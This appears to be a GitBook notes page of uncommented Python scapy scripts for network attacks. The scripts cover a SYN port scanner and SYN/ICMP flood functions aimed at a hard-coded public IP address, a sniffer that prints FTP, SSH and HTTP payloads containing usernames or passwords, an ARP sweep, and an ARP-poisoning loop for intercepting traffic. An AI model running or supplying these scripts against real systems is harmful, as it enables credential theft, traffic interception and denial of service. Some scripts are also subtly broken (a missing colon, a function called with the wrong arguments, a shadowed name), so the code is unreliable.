---
layout:
  title:
    visible: false
  description:
    visible: false
  tableOfContents:
    visible: false
  outline:
    visible: false
  pagination:
    visible: false
---

# scapy/network scanning

<div data-full-width="true">

<figure><img src=".gitbook/assets/1 (23).jpg" alt=""><figcaption></figcaption></figure>

</div>

<div data-full-width="true">

<figure><img src=".gitbook/assets/2 (12).jpg" alt=""><figcaption></figcaption></figure>

</div>

<div data-full-width="true">

<figure><img src=".gitbook/assets/3 (7).jpg" alt=""><figcaption></figcaption></figure>

</div>

<div data-full-width="true">

<figure><img src=".gitbook/assets/4 (4).jpg" alt=""><figcaption></figcaption></figure>

</div>

<div data-full-width="true">

<figure><img src=".gitbook/assets/5 (3).jpg" alt=""><figcaption></figcaption></figure>

</div>

<div data-full-width="true">

<figure><img src=".gitbook/assets/6 (2).jpg" alt=""><figcaption></figcaption></figure>

</div>

<div data-full-width="true">

<figure><img src=".gitbook/assets/7 (2).jpg" alt=""><figcaption></figcaption></figure>

</div>

pip install scapy

```python
from scapy.all import *

def pkt_callback(pkt):
  print(pkt.show())
  
def main():
  sniff(prn=pkt_callback, count=1)
  
if __name__=="__main__":
  main()
```

**PORT SCANNER**

```python
from scapy.all import *

target = "146.59.35.163"

for port in range(20, 100):
  pkt = IP(dst=target)/TCP(dport=port, sport=1337, flags="S")
  ans, noans = sr(pkt, timeout=0.5, verbose=False)
  if ans:
    data = str(ans[0]).split("|")[3].split()[1].split("sport=")
    if not data[1].isdigit():
      print(f"{port}:{data}")
```

**BERKELEY PACKET FILTER**

```python
from scapy.all import *

def call_back(pkt)
  if pkt[TCP].payload:
    my_pkt = str(pkt[TCP].payload)
    if 'user' in my_pkt.lower() or 'pass' in my_pkt.lower():
      print(pkt[IP].dst)
      print(my_pkt)
      
def main():
  sniff(filter='tcp port 21 or tcp port 22 or tcp port 80', prn=call_back, store=0)
  
if __name__ == "__main__":
  main()
```

<div data-full-width="true">

<figure><img src=".gitbook/assets/1 (24).jpg" alt=""><figcaption></figcaption></figure>

</div>

```python
from scapy.all import *

for i in range (1,255):
  ip = f"172.17.240.{i}"
  arp_out = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip, hwdst="ff:ff:ff:ff:ff:ff")
  arp_in = srp1(arp_out, timeout=0.5, verbose=False)
  if arp_in:
    print(f"IP: {arp_in.psrc} MAC: {arp_in.hwsrc}")
```

<div data-full-width="true">

<figure><img src=".gitbook/assets/1 (25).jpg" alt=""><figcaption></figcaption></figure>

</div>

```python
from scapy.all import *

def arp_poison(gt_ip, gt_mac, t_mac):
  while True:
    pkt_to_gt = ARP(op=2, pdst=gt_ip, hwdst=gt_mac, psrc=t_ip)
    pkt_to_t = ARP(op=2, pdst=t_ip, hwdst=t_mac, psrc=gt_ip)
    send(pkt_to_gt)
    send(pkt_to_t)
    
def get_mac(ip):
  arp_out = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op=1, pdst=ip)
  ans, noans = srp(arp_out, timeout=0.5, retry=2, verbose=False)
  for send, receive in ans:
    return receive[ARP].hwsrc
  return None
  
gt_ip = input("Gt_ip: ")
t_ip = input("T_ip: ")
gt_mac = get_mac(gt_ip)
t_mac = get_mac(t_ip)

arp_poison(gt_ip, gt_mac, t_ip, t_mac)
```

<div data-full-width="true">

<figure><img src=".gitbook/assets/1 (26).jpg" alt=""><figcaption></figcaption></figure>

</div>

```python
from scapy.all import *

def syn_flood(ip, port):
  pkt = IP(dst=ip)/TCP(dport=port, sport=1337, flags='S')/(b'X'*6000)
  send(pkt, loop=10, verbose=False)
  
def icmp_flood(ip):
  pkt = IP(dst=ip)/ICMP()/(b'414141'*6000)
  send(pkt, loop=10, verbose=False)
  
syn_flood("146.59.35.163",80)
icmp_flood("146.59.35.163")
```
